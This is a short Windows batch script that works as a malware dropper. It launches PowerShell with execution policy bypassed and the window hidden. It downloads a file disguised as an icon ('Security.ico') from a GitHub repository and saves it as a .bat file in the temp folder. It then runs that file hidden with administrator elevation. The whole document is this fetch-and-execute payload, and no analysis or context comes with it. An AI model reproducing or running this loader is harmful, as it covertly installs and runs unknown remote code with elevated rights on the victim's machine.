@echo off
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& {Invoke-WebRequest -Uri 'https://github.com/moyousry95/slash2/raw/refs/heads/main/Security.ico' -OutFile $env:TEMP\Security.bat; Start-Process -FilePath $env:TEMP\Security.bat -WindowStyle Hidden -Verb RunAs}"
exit
